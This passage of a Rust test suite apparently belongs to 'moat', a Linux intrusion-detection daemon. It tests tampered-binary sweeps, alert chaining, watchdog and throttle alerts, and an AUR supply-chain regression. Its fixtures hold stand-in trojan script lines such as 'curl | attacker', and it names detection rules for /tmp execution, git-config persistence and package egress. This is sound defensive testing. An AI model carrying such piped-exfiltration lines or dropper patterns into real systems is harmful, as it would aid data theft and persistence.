            last_ts: "2026-09-05T14:44:23Z".into(),
            span_secs: 1,
            steps: vec![],
            steps_total: 0,
            truncated: false,
            members: vec![],
            triggers_total: 0,
            summary: String::new(),
        };

        let mut put = |id: &str, rule: &str, family: &str, chain| {
            let mut a = demo_alert(id);
            a.rule = rule.into();
            a.family = family.into();
            a.tier = "detection".into();
            a.chain = chain;
            d.store.append_alert(&a).unwrap();
        };

        // Gateable: a cred alert with an exec neighbour.
        put("01A0", "moat-gateable", "cred", Some(chain_of(&["cred", "exec"])));
        put("01A1", "moat-gateable", "cred", Some(chain_of(&["cred", "exec"])));

        // NOT gateable, and the trap: chained, but only with itself.
        put("01B0", "moat-alone", "cred", Some(chain_of(&["cred"])));
        put("01B1", "moat-alone", "cred", Some(chain_of(&["cred"])));

        // Not chained at all.
        put("01C0", "moat-never", "cred", None);

        let r = crate::control::dispatch(&mut d, &serde_json::json!({"cmd": "neighbours"}));
        let rules = r["rules"].as_array().expect("rules");
        let by = |name: &str| {
            rules
                .iter()
                .find(|v| v["rule"] == name)
                .unwrap_or_else(|| panic!("{name} missing from {rules:?}"))
        };

        assert_eq!(by("moat-gateable")["cross_family_pct"], 100.0);
        assert_eq!(
            by("moat-alone")["chained"], 2,
            "it really was in a chain, which is what makes this the trap"
        );
        assert_eq!(
            by("moat-alone")["cross_family_pct"],
            0.0,
            "a same-family neighbour is the rule vouching for itself"
        );
        assert_eq!(by("moat-never")["cross_family_pct"], 0.0);

        // The window is reported, because a rate over an unstated span reads as
        // though it were over a representative one.
        assert!(r["first_ts"].is_string() && r["last_ts"].is_string());
        assert_eq!(r["total"], 5);
    }

    /// A modified package-owned file is said out loud, once.
    ///
    /// The demotion to `foreign` makes every OTHER alert about the file read
    /// louder, which is right and is not enough: on a quiet machine nothing
    /// else may ever fire about it, and then the most interesting thing moat
    /// knows would live only in a field nobody reads.
    #[test]
    fn a_modified_package_file_is_reported_once_and_again_only_if_it_changes() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let p = self_proc("exec");
        let why = "the bytes on disk are 10733 where power-profiles-daemon 0.30-1 recorded                    10741, so this is not the file the package shipped";
        let actor = crate::provenance::Actor {
            provenance: crate::provenance::Provenance::Foreign,
            package: Some("power-profiles-daemon 0.30-1".into()),
            script: None,
            modified: Some(why.into()),
        };

        // Control: an intact actor says nothing, so the emit below is caused by
        // `modified` and not merely by calling the function.
        let intact = crate::provenance::Actor {
            modified: None,
            ..actor.clone()
        };
        let n = d.store.load().len();
        d.report_modified_binary(&intact, &p);
        assert_eq!(d.store.load().len(), n, "an intact file is not an event");

        d.report_modified_binary(&actor, &p);
        let hits: Vec<_> = d
            .store
            .load()
            .into_iter()
            .filter(|a| a.rule == crate::rules::BINARY_MODIFIED)
            .collect();
        assert_eq!(hits.len(), 1, "reported");
        assert_eq!(hits[0].severity, "high");
        assert!(
            hits[0].explain.evidence.iter().any(|e| e.contains("10741")),
            "the reason is carried, not just the rule name: {:?}",
            hits[0].explain.evidence
        );
        assert!(
            hits[0]
                .explain
                .evidence
                .iter()
                .any(|e| e.contains("pacman -Qkk power-profiles-daemon")),
            "and a way to check it independently: {:?}",
            hits[0].explain.evidence
        );

        // The classifier is consulted while building EVERY alert, so the same
        // file must not raise this again.
        for _ in 0..5 {
            d.report_modified_binary(&actor, &p);
        }
        assert_eq!(
            d.store
                .load()
                .iter()
                .filter(|a| a.rule == crate::rules::BINARY_MODIFIED)
                .count(),
            1,
            "one tampered file is one finding, not one per alert that mentions it"
        );

        // A file that changes AGAIN passes this guard -- the reason is part of
        // the key -- and then meets the engine's own 60-second fold, which keys
        // the `x` family on (rule, title). Same file, same title, so inside the
        // window it becomes a count on the existing row rather than a second
        // one. That is the documented behaviour of that fold, not something
        // this rule should route around: past 60 seconds it is a row of its own.
        let changed_again = crate::provenance::Actor {
            modified: Some(
                "the sha256 on disk (deadbeef0000) is not the one power-profiles-daemon \
                 0.30-1 recorded (38532d5fb065)"
                    .into(),
            ),
            ..actor.clone()
        };
        d.report_modified_binary(&changed_again, &p);
        let rows: Vec<_> = d
            .store
            .load()
            .into_iter()
            .filter(|a| a.rule == crate::rules::BINARY_MODIFIED)
            .collect();
        assert_eq!(rows.len(), 1, "folded inside the 60s window");
        assert_eq!(
            rows[0].count,
            Some(2),
            "but counted, so the second change is not lost"
        );
    }

    /// A trojaned binary that never runs is still found.
    ///
    /// The classification path only reads a file something else already
    /// alerted about, so a binary that sits quietly is never looked at -- and
    /// sitting quietly is what a good one does. The sweep asks unprompted.
    #[test]
    fn the_sweep_finds_a_modified_binary_that_nothing_has_alerted_about() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let db = dir.path().join("pacman-local");
        let bin = dir.path().join("bin");
        std::fs::create_dir_all(&bin).unwrap();

        // Two executables, because the two halves of the check fail
        // differently: a size difference is conclusive without reading the
        // file, and a same-size edit is only caught by the digest. A trojan
        // that keeps the length is the one a size check alone waves through.
        let quiet = bin.join("curl");
        std::fs::write(&quiet, b"#!/bin/sh\nthe real one\n").unwrap();
        std::fs::set_permissions(&quiet, std::fs::Permissions::from_mode(0o755)).unwrap();
        let quiet_s = quiet.to_string_lossy().to_string();

        let samesize = bin.join("wget");
        std::fs::write(&samesize, b"#!/bin/sh\nthe real one\n").unwrap();
        std::fs::set_permissions(&samesize, std::fs::Permissions::from_mode(0o755)).unwrap();
        let samesize_s = samesize.to_string_lossy().to_string();

        // A package file with NO execute bit: config files are package-owned
        // and are meant to be edited, so the sweep must not report them.
        let conf = bin.join("curlrc");
        std::fs::write(&conf, b"original\n").unwrap();
        std::fs::set_permissions(&conf, std::fs::Permissions::from_mode(0o644)).unwrap();
        let conf_s = conf.to_string_lossy().to_string();

        std::fs::create_dir_all(&db).unwrap();
        crate::provenance::testkit::fake_local(
            &db,
            &[("curl", "8.9.1-1", "pgp", &[&quiet_s, &samesize_s, &conf_s])],
        );
        crate::provenance::testkit::fake_mtree(
            &db,
            "curl-8.9.1-1",
            &[&quiet_s, &samesize_s, &conf_s],
        );

        let (_, mut cfg) = dev_daemon(dir.path());
        cfg.paths.pacman_local = db.clone();
        let mut d = Daemon::new(cfg, &dir.path().join("moat.toml")).unwrap();
        d.homes = vec!["/home/dan".into()];

        // Control: nothing has been touched, so a full sweep says nothing. If
        // this reported, the positive below would prove nothing.
        let n = d.store.load().len();
        for i in 0..40 {
            d.tick(1_000 + i, false);
        }
        assert_eq!(d.store.load().len(), n, "an intact package is silent");

        // Now trojan the binary and edit the config, and let a new sweep run.
        std::fs::write(&quiet, b"#!/bin/sh\ncurl | attacker\n").unwrap();
        std::fs::set_permissions(&quiet, std::fs::Permissions::from_mode(0o755)).unwrap();
        // Same length as "the real one", so only the digest can tell.
        std::fs::write(&samesize, b"#!/bin/sh\nthe FAKE one\n").unwrap();
        std::fs::set_permissions(&samesize, std::fs::Permissions::from_mode(0o755)).unwrap();
        assert_eq!(
            std::fs::metadata(&samesize).unwrap().len(),
            23,
            "the same-size trojan must really be the same size"
        );
        std::fs::write(&conf, b"edited by the administrator\n").unwrap();

        let later = 1_000 + 25 * 3_600;
        for i in 0..40 {
            d.tick(later + i, false);
        }
        let hits: Vec<_> = d
            .store
            .load()
            .into_iter()
            .filter(|a| a.rule == crate::rules::BINARY_MODIFIED)
            .collect();
        let paths: Vec<&str> = hits
            .iter()
            .filter_map(|a| a.file.as_ref().map(|f| f.path.as_str()))
            .collect();
        assert!(
            paths.contains(&quiet_s.as_str()),
            "the resized trojan: {paths:?}"
        );
        assert!(
            paths.contains(&samesize_s.as_str()),
            "and the same-size one, which only the digest catches: {paths:?}"
        );
        assert!(
            !paths.contains(&conf_s.as_str()),
            "but not the config file, which is package-owned and meant to be edited: {paths:?}"
        );
        assert_eq!(hits.len(), 2, "two findings, no more");

        // The two are caught by different halves and must SAY so. Removing the
        // size check does not change what is detected -- a resized file fails
        // the digest too -- so its only observable effect is the reason given,
        // and a reason that quotes the wrong evidence is a reason a person
        // cannot check.
        let reason_for = |p: &str| -> String {
            hits.iter()
                .find(|a| a.file.as_ref().map(|f| f.path.as_str()) == Some(p))
                .map(|a| a.explain.evidence.join(" | "))
                .unwrap_or_default()
        };
        assert!(
            reason_for(&quiet_s).contains("bytes on disk are"),
            "the resized one is reported by size, without being read: {}",
            reason_for(&quiet_s)
        );
        assert!(
            reason_for(&samesize_s).contains("sha256 on disk"),
            "the same-size one can only be reported by digest: {}",
            reason_for(&samesize_s)
        );
        assert!(
            hits[0].explain.evidence.iter().any(|e| e.contains("curl 8.9.1-1")),
            "named by its package: {:?}",
            hits[0].explain.evidence
        );
    }

    /// The memory of what has been reported is bounded, and forgets the
    /// OLDEST first.
    ///
    /// It is written into `state.json`, so without a cap a file edited over
    /// and over grows that file for ever. The direction of the bound matters:
    /// forgetting an old entry can cost a duplicate alert about something that
    /// changed long ago, and can never cost a missing one about something that
    /// changed just now.
    #[test]
    fn the_reported_memory_is_capped_and_forgets_the_oldest_first() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());

        let first = "/usr/bin/first\0changed".to_string();
        assert!(d.remember_modified(first.clone()), "new");
        assert!(!d.remember_modified(first.clone()), "and only once");

        // Fill past the cap. The first entry must be the one pushed out.
        for i in 0..600 {
            d.remember_modified(format!("/usr/bin/f{i}\0changed"));
        }
        assert!(
            d.modified_reported.len() <= 512,
            "bounded, not {}",
            d.modified_reported.len()
        );
        assert!(
            !d.modified_reported.contains(&first),
            "the oldest is what leaves"
        );
        // The most recent survives: forgetting must not reach the new end.
        assert!(d
            .modified_reported
            .contains(&"/usr/bin/f599\0changed".to_string()));
        // And a forgotten entry is reportable again -- a duplicate alert, not
        // a silence.
        assert!(d.remember_modified(first), "reportable again once forgotten");
    }

    /// An EXECUTABLE file in pacman's backup array is the administrator's to
    /// edit, and the sweep must not call that tampering.
    ///
    /// "Executables only" was the proxy for "not a config file". It is not one:
    /// /etc/cron.hourly/snapper and sddm's Xsetup are both executable, both
    /// backup-marked, and both exist to be customised. Reported every pass, for
    /// ever, they are the kind of false positive that gets a whole check
    /// switched off.
    #[test]
    fn an_executable_config_file_in_the_backup_array_is_not_tampering() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let db = dir.path().join("pacman-local");
        let bin = dir.path().join("bin");
        std::fs::create_dir_all(&bin).unwrap();

        // Executable, package-owned, and in the backup array.
        let hook = bin.join("snapper-hook");
        std::fs::write(&hook, b"#!/bin/sh\nas shipped\n").unwrap();
        std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o755)).unwrap();
        let hook_s = hook.to_string_lossy().to_string();

        // Executable, package-owned, NOT in the backup array: the control. If
        // this stops reporting, the exclusion is too wide and the sweep is off.
        let real = bin.join("snapper");
        std::fs::write(&real, b"#!/bin/sh\nas shipped\n").unwrap();
        std::fs::set_permissions(&real, std::fs::Permissions::from_mode(0o755)).unwrap();
        let real_s = real.to_string_lossy().to_string();

        std::fs::create_dir_all(&db).unwrap();
        crate::provenance::testkit::fake_local(
            &db,
            &[("snapper", "0.13.1-3", "pgp", &[&hook_s, &real_s])],
        );
        crate::provenance::testkit::fake_mtree(&db, "snapper-0.13.1-3", &[&hook_s, &real_s]);
        crate::provenance::testkit::fake_backup(&db, "snapper-0.13.1-3", &[&hook_s]);

        let (_, mut cfg) = dev_daemon(dir.path());
        cfg.paths.pacman_local = db.clone();
        let mut d = Daemon::new(cfg, &dir.path().join("moat.toml")).unwrap();
        d.homes = vec!["/home/dan".into()];

        // The administrator edits their hook, and someone trojans the binary.
        std::fs::write(&hook, b"#!/bin/sh\nmy own customisation\n").unwrap();
        std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o755)).unwrap();
        std::fs::write(&real, b"#!/bin/sh\nsnapper | attacker\n").unwrap();
        std::fs::set_permissions(&real, std::fs::Permissions::from_mode(0o755)).unwrap();

        for i in 0..40 {
            d.tick(1_000 + i, false);
        }
        let paths: Vec<String> = d
            .store
            .load()
            .into_iter()
            .filter(|a| a.rule == crate::rules::BINARY_MODIFIED)
            .filter_map(|a| a.file.map(|f| f.path))
            .collect();
        assert!(
            paths.iter().any(|p| p == &real_s),
            "the trojaned binary must still be found: {paths:?}"
        );
        assert!(
            !paths.iter().any(|p| p == &hook_s),
            "but not the backup-marked hook, which is the administrator's to \
             edit: {paths:?}"
        );
    }

    /// A sweep interrupted by a restart resumes where it stopped.
    ///
    /// The queue lived only in memory while `last_sweep` advanced only on
    /// completion, so a daemon restarting more often than a full pass takes
    /// (~1.6 h here) began again at the same end of the same sorted list every
    /// time. The packages after the cursor were never reached at all -- a
    /// permanent blind spot, which is the one thing a sweep must not have.
    #[test]
    fn an_interrupted_sweep_resumes_instead_of_starting_over() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let db = dir.path().join("pacman-local");
        let bin = dir.path().join("bin");
        std::fs::create_dir_all(&bin).unwrap();
        std::fs::create_dir_all(&db).unwrap();

        // Enough packages that a few ticks cannot finish the pass. Named so
        // that sorted order is predictable and the LAST one is unambiguous.
        let mut names = Vec::new();
        for i in 0..12 {
            let name = format!("pkg{:02}", i);
            let f = bin.join(&name);
            std::fs::write(&f, b"#!/bin/sh\nas shipped\n").unwrap();
            std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
            let fs_ = f.to_string_lossy().to_string();
            crate::provenance::testkit::fake_local(&db, &[(&name, "1-1", "pgp", &[&fs_])]);
            crate::provenance::testkit::fake_mtree(&db, &format!("{}-1-1", name), &[&fs_]);
            names.push((name, fs_));
        }

        // The tampered file is in the LAST package by sort order, so it is
        // reachable only if the sweep actually gets there.
        let (last_name, last_path) = names.last().unwrap().clone();
        std::fs::write(&last_path, b"#!/bin/sh\nthe trojan\n").unwrap();
        std::fs::set_permissions(&last_path, std::fs::Permissions::from_mode(0o755)).unwrap();

        let (_, cfg) = dev_daemon(dir.path());
        let mut cfg = cfg;
        cfg.paths.pacman_local = db.clone();
        let toml = dir.path().join("moat.toml");

        // Three ticks, then "restart": a fresh Daemon reading the same state.
        let mut d = Daemon::new(cfg.clone(), &toml).unwrap();
        d.homes = vec!["/home/dan".into()];
        for i in 0..3 {
            d.tick(1_000 + i, false);
        }
        let cursor = d.sweep_cursor.clone();
        assert!(!cursor.is_empty(), "a pass is in flight");
        assert_eq!(d.sweep.as_ref().map(|v| v.len()), Some(9), "3 of 12 done");
        assert!(
            !cursor.starts_with(&format!("{}-", last_name)),
            "and it has NOT reached the last package yet, or this proves nothing"
        );
        d.write_state();
        drop(d);

        let mut d2 = Daemon::new(cfg, &toml).unwrap();
        d2.homes = vec!["/home/dan".into()];
        assert_eq!(d2.sweep_cursor, cursor, "the cursor survived the restart");

        // More than the 9 packages left, and FEWER than the whole list of 12.
        // A resumed pass finishes with room to spare; a pass that restarted at
        // the beginning reaches pkg10 and never the tampered pkg11. Giving it
        // more ticks than the list is long would let the broken behaviour pass
        // too, which is how a test comes to prove nothing -- this one was
        // written with 60 ticks first and did exactly that.
        for i in 0..11 {
            d2.tick(1_010 + i, false);
        }
        let paths: Vec<String> = d2
            .store
            .load()
            .into_iter()
            .filter(|a| a.rule == crate::rules::BINARY_MODIFIED)
            .filter_map(|a| a.file.map(|f| f.path))
            .collect();
        assert!(
            paths.iter().any(|p| p == &last_path),
            "the sweep must reach the packages after the cursor: {paths:?}"
        );
        assert!(d2.sweep_cursor.is_empty(), "and the finished pass clears it");
    }

    /// `sweep_secs = 0` means off, not "due every tick".
    ///
    /// The interval is compared as `now - last >= every`, which a zero
    /// satisfies always. Read that way, switching the sweep off would instead
    /// hash every package-owned executable on the machine on EVERY tick --
    /// the loudest possible reading of "disabled".
    #[test]
    fn a_zero_sweep_interval_turns_the_sweep_off_rather_than_on() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let db = dir.path().join("pacman-local");
        let bin = dir.path().join("bin");
        std::fs::create_dir_all(&bin).unwrap();
        let exe = bin.join("curl");
        std::fs::write(&exe, b"#!/bin/sh\nreal\n").unwrap();
        std::fs::set_permissions(&exe, std::fs::Permissions::from_mode(0o755)).unwrap();
        let exe_s = exe.to_string_lossy().to_string();
        std::fs::create_dir_all(&db).unwrap();
        crate::provenance::testkit::fake_local(&db, &[("curl", "8.9.1-1", "pgp", &[&exe_s])]);
        crate::provenance::testkit::fake_mtree(&db, "curl-8.9.1-1", &[&exe_s]);
        std::fs::write(&exe, b"#!/bin/sh\nfake\n").unwrap();
        std::fs::set_permissions(&exe, std::fs::Permissions::from_mode(0o755)).unwrap();

        let (_, mut cfg) = dev_daemon(dir.path());
        cfg.paths.pacman_local = db.clone();

        // Control: with an interval set, this modification IS found -- so the
        // silence below is the switch and not a broken fixture.
        let mut on = Daemon::new(cfg.clone(), &dir.path().join("on.toml")).unwrap();
        on.cfg.thresholds.sweep_secs = 24 * 3_600;
        for i in 0..20 {
            on.tick(1_000 + i, false);
        }
        assert_eq!(
            on.store
                .load()
                .iter()
                .filter(|a| a.rule == crate::rules::BINARY_MODIFIED)
                .count(),
            1,
            "the fixture really does contain a modified executable"
        );

        let dir2 = tempfile::tempdir().unwrap();
        let (_, mut cfg2) = dev_daemon(dir2.path());
        cfg2.paths.pacman_local = db;
        let mut off = Daemon::new(cfg2, &dir2.path().join("off.toml")).unwrap();
        off.cfg.thresholds.sweep_secs = 0;
        for i in 0..20 {
            off.tick(1_000 + i, false);
        }
        assert_eq!(
            off.store
                .load()
                .iter()
                .filter(|a| a.rule == crate::rules::BINARY_MODIFIED)
                .count(),
            0,
            "zero means off"
        );
        assert_eq!(off.last_sweep, 0, "and nothing was even started");
    }

    /// A file the operator has already been told about stays told about,
    /// across a restart.
    ///
    /// Omarchy's installer rewrites `/usr/bin/powerprofilesctl`'s shebang so it
    /// uses the system python3 and not mise's, so every Omarchy machine has one
    /// permanently modified package file. Held in memory only, that was a
    /// `high` alert every time moatd started. The fact is about the disk, so
    /// the record of having reported it has to outlive the process.
    #[test]
    fn a_reported_modification_is_not_reported_again_after_a_restart() {
        let dir = tempfile::tempdir().unwrap();
        let p = self_proc("exec");
        let actor = crate::provenance::Actor {
            provenance: crate::provenance::Provenance::Foreign,
            package: Some("power-profiles-daemon 0.30-1".into()),
            script: None,
            modified: Some(
                "the bytes on disk are 10733 where power-profiles-daemon 0.30-1 recorded 10741"
                    .into(),
            ),
        };

        let cfg = {
            let (mut d, cfg) = dev_daemon(dir.path());
            d.report_modified_binary(&actor, &p);
            assert_eq!(
                d.store
                    .load()
                    .iter()
                    .filter(|a| a.rule == crate::rules::BINARY_MODIFIED)
                    .count(),
                1,
                "reported once by the first daemon"
            );
            cfg
        };

        // A new Daemon over the same state directory: a restart.
        let mut d2 = Daemon::new(cfg, &dir.path().join("moat.toml")).unwrap();
        d2.homes = vec!["/home/dan".into()];
        assert!(
            d2.modified_reported
                .iter()
                .any(|k| k.contains("power-profiles-daemon")),
            "the restarted daemon remembers what it already said"
        );
        d2.report_modified_binary(&actor, &p);
        assert_eq!(
            d2.store
                .load()
                .iter()
                .filter(|a| a.rule == crate::rules::BINARY_MODIFIED)
                .count(),
            1,
            "and does not say it again"
        );

        // Control: a DIFFERENT modification is still reported, so the memory
        // silences a repeat and not the rule.
        let changed = crate::provenance::Actor {
            modified: Some("the sha256 on disk (deadbeef0000) is not the one recorded".into()),
            ..actor.clone()
        };
        d2.report_modified_binary(&changed, &p);
        assert!(
            d2.store
                .load()
                .iter()
                .filter(|a| a.rule == crate::rules::BINARY_MODIFIED)
                .count()
                >= 1,
            "a new change still gets through the memory"
        );
        assert!(
            d2.modified_reported.len() >= 2,
            "and is remembered in its own right"
        );
    }

    /// Missing inputs must over-report, never hide. An old `state.json` has no
    /// `awake` key, and that must read as "the whole gap was blind".
    #[test]
    fn a_state_file_with_no_awake_clock_falls_back_to_the_wall_gap() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        // After this boot, so the reboot branch cannot claim it.
        d.started = crate::util::boot_time() + 100_000;
        d.last_heartbeat = d.started - 1200;
        d.last_awake = 0;
        let split = d.downtime();
        assert_eq!(split.blind, 1200, "not knowing must not shrink the hole");
        assert_eq!(split.wall, 1200);
        assert_eq!(split.powered_off + split.suspended, 0);
    }

    /// Killing the panel must not be a silent way to switch Moat off.
    ///
    /// Every notification comes from a program in the user's own session, so
    /// anything running as the user can end them with one `pkill` -- no
    /// evasion, no privilege -- while moatd keeps recording faithfully and
    /// nobody ever sees it. moatd is root and cannot be stopped that way, so
    /// the noticing lives here.
    #[test]
    fn moat_notices_when_nothing_is_reading_its_alerts() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let now = util::unix_secs();

        // A surfaced alert nobody has answered.
        let proc = ProcInfo {
            exec_id: "e-x".into(),
            pid: 4242,
            uid: 1000,
            exe: "/tmp/moat-watchdog-no-such-lab/dropper".into(),
            args: String::new(),
            cwd: "/tmp".into(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            in_container: None,
            sid: None,
            tty: None,
            ..Default::default()
        };
        let mut f = Finding::new(
            "moat-persist-git-config-write",
            crate::policy::PolicyMeta::fallback("moat-persist-git-config-write"),
            proc,
        );
        f.meta.family = "persist".into();
        f.meta.severity = "high".into();
        f.hook = "file_post_open".into();
        f.file = Some(crate::alert::FileRef {
            path: "/tmp/moat-watchdog-no-such-lab/.git/config".into(),
            sha256: None,
        });
        d.emit(f).expect("the alert must be recorded");
        assert!(
            d.store.load().iter().any(|a| !a.acked && a.surface == "alerts"),
            "precondition: something is waiting for a human"
        );

        // Somebody is watching: nothing to say.
        d.note_watcher(now);
        let n = d.store.load().len();
        d.watchdog_tick(now + 60);
        assert_eq!(d.store.load().len(), n, "a panel that is polling is not a gap");

        // Half an hour of silence with an alert waiting is.
        d.watchdog_tick(now + 3600);
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-x-nobody-is-watching")
            .expect("the gap must be recorded");
        assert_eq!(a.severity, "high");

        // Said once, not every tick: this repeats for as long as the panel is
        // gone, and burying the queue would be the same failure again.
        let n = d.store.load().len();
        d.watchdog_tick(now + 3700);
        assert_eq!(d.store.load().len(), n);
    }

    /// A dropped-events message is an alert, not a shrug.
    ///
    /// `cgroup-rate` is 20000 events/s per cpu and serde ignores unknown fields, so
    /// `process_throttle` parsed into nothing. An attacker exceeding that rate
    /// gets the sensor to discard their own events -- the one evasion where the
    /// evidence is what goes missing, so the throttle itself has to be said out
    /// loud.
    #[test]
    fn the_sensor_dropping_events_is_itself_an_alert() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let line = r#"{"process_throttle":{"type":"THROTTLE_START","cgroup":"/user.slice/app-noise.scope"},"time":"2026-09-05T10:00:00.000Z"}"#;
        d.handle_line(line);

        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-x-sensor-throttled")
            .expect("a throttle must be recorded");
        assert_eq!(a.severity, "high");
        assert!(a.explain.evidence.iter().any(|e| e.contains("app-noise.scope")));

        // Rate limited: a flood throttles continuously and one alert per
        // dropped batch would bury the thing it is warning about.
        let n = d.store.load().len();
        d.handle_line(line);
        d.handle_line(line);
        assert_eq!(d.store.load().len(), n, "one an hour per cgroup, not one per message");

        // THROTTLE_STOP is the recovery, not a new hole.
        d.handle_line(r#"{"process_throttle":{"type":"THROTTLE_STOP","cgroup":"/other"},"time":"2026-09-05T10:00:00.000Z"}"#);
        assert_eq!(d.store.load().len(), n);
    }

    /// The 2026-09-04 AUR miss, pinned.
    ///
    /// `makepkg` egressed to a host outside the registry and ran a dropped
    /// binary out of /tmp. The /tmp exec was `high` and `first_seen` -- the
    /// strongest signal in the run -- but its rule was demoted rule-wide,
    /// because the developer's own `cargo test` trips the same rule all day.
    /// A demotion used to make a step context-only, so the chain was left with
    /// `low`/`medium` triggers, came out `medium`, and nothing reached the
    /// badge. The user ran a full attack and saw no alerts at all.
    ///
    /// Frequency is not consent. Only the user's allowlist silences a step.
    #[test]
    fn a_noise_demoted_alert_is_still_a_chain_trigger() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        // No path here may exist: a `high` alert takes an incident snapshot,
        // which opens and hashes the exe and the file it names.
        let proc = |exec_id: &str, pid: u32, exe: &str| ProcInfo {
            exec_id: exec_id.into(),
            pid,
            uid: 1000,
            exe: exe.into(),
            args: String::new(),
            cwd: "/tmp/moat-aur-regression-no-such-lab".into(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            in_container: None,
            sid: None,
            tty: None,
            ..Default::default()
        };
        let actor = proc("e-py", 2_257_600, "/usr/bin/no-such-python");
        let makepkg = proc("e-mk", 2_257_581, "/usr/bin/no-such-makepkg");
        let finding = |rule: &str, family: &str, severity: &str, path: String| {
            let mut f = Finding::new(rule, crate::policy::PolicyMeta::fallback(rule), actor.clone());
            f.meta.family = family.into();
            f.meta.severity = severity.into();
            f.hook = "file_post_open".into();
            f.hook_detail = Some("read".into());
            f.ancestry = vec![makepkg.clone()];
            f.file = Some(crate::alert::FileRef { path, sha256: None });
            f
        };

        // Flood the exact shape the attack will later use, so the guard demotes
        // the pattern the attack trips. (The rule-wide "fan-out backstop" that
        // this used to lean on is gone -- see `note_alert` -- because silencing
        // shapes nobody has seen is what caused the 2026-09-04 miss in the
        // first place. The demotion still has to be survivable by a chain, and
        // that is what this test pins.)
        d.baseline.noisy_rule_per_day = 2;
        for i in 0..6 {
            let _ = d.emit(finding(
                "moat-exec-untrusted-tmpfs",
                "exec",
                "high",
                format!("/tmp/moat-aur-regression-no-such-lab/tool{}", i),
            ));
        }
        assert!(
            d.baseline.demoted_rules().contains(&"moat-exec-untrusted-tmpfs".to_string()),
            "precondition: the flood demoted the pattern the attack later trips"
        );

        // Now the attack: the demoted /tmp exec, and egress in the same tree.
        let a = d
            .emit(finding(
                "moat-exec-untrusted-tmpfs",
                "exec",
                "high",
                "/tmp/moat-aur-regression-no-such-lab/browser-helper".to_string(),
            ))
            .expect("a demoted rule still records an alert");
        assert_eq!(
            d.find_alert(&a).unwrap().surface,
            "timeline",
            "precondition: the demotion did put this step on the timeline"
        );
        let b = d
            .emit(finding(
                "moat-x-pkg-egress",
                "net",
                "medium",
                "/tmp/moat-aur-regression-no-such-lab/beacon".to_string(),
            ))
            .expect("the egress must raise an alert");

        let alerts = d.store.load();
        let by_id = |id: &str| alerts.iter().find(|x| x.id == id).unwrap().clone();
        let chain = by_id(&a).chain.clone().expect("the two must correlate");
        assert_eq!(by_id(&b).chain.as_ref().map(|c| c.id.as_str()), Some(chain.id.as_str()));

        // The demoted step is a TRIGGER. This is the whole fix: a rule the
        // guard called noisy is the prime candidate for a sequence, not a thing
        // that can no longer speak.
        assert!(
            chain.steps.iter().all(|s| s.is_trigger()),
            "a noise-guard demotion must not turn a step into context"
        );
        // ...so the chain sees the `high` and says so...
        assert!(crate::alert::severity_rank(&chain.severity) >= 2,
                "chain is {} with a high trigger in it", chain.severity);
        // ...and it reaches the user, which is the part that failed live.
        assert_eq!(by_id(&a).surface, "alerts", "a high chain has to reach the badge");
    }

    // ------------------------------------------------- BASELINE §4, the tier

    /// A `signal` finding, ready to hand to `emit`.
    ///
    /// `severity` is the rule's own and is deliberately `high`: the whole point
    /// of the tier is that it does NOT touch the severity, because chains need
    /// `>= medium` triggers, the baseline learns on severity and rarity does
    /// not see the tier at all.
    fn signal_finding(actor: &ProcInfo, parent: &ProcInfo, path: &str) -> Finding {
        let rule = "moat-exec-untrusted-tmpfs";
        let mut m = crate::policy::PolicyMeta::fallback(rule);
        m.family = "exec".into();
        m.severity = "high".into();
        m.tier = crate::policy::TIER_SIGNAL.into();
        let mut f = Finding::new(rule, m, actor.clone());
        f.hook = "bprm_check_security".into();
        f.ancestry = vec![parent.clone()];
        f.file = Some(crate::alert::FileRef { path: path.into(), sha256: None });
        f
    }

    fn no_such_proc(exec_id: &str, pid: u32, exe: &str) -> ProcInfo {
        ProcInfo {
            exec_id: exec_id.into(),
            pid,
            uid: 1000,
            exe: exe.into(),
            args: String::new(),
            cwd: "/tmp/moat-tier-test-no-such-dir".into(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            in_container: None,
            sid: None,
            tty: None,
            ..Default::default()
        }
    }

    /// The declaration, in every place that consults it.
    ///
    /// `signal` is the sentence "this rule is a building block, not a
    /// detection", said by the rule instead of discovered by a 24 h circuit
    /// breaker that forgets. What it changes and what it must not change are
    /// both load-bearing, so both are asserted here.
    /// moat's own sandbox runs npm, pip, cargo and makepkg under bwrap, which
    /// gives them their own mount namespace. Nothing downstream can tell that
    /// namespace from Docker's, so the container switch has to be told about
    /// the one case moat exists for.
    ///
    /// On 2026-09-08 a HOST makepkg build produced a reason that argued with
    /// itself in one line: "stays high: package install: never downgraded;
    /// shown on the timeline only: this ran in a container and container
    /// inspection is off".
    #[test]
    fn a_sandboxed_package_install_is_not_quietened_as_a_container() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        assert!(!d.inspect_containers, "off is the default this test is about");

        let mut actor = no_such_proc("e-mk", 4_200_100, "/usr/bin/makepkg");
        // What bwrap does to a package install, and what Docker does to a
        // container, are the same fact by the time it reaches here.
        actor.in_container = Some(true);
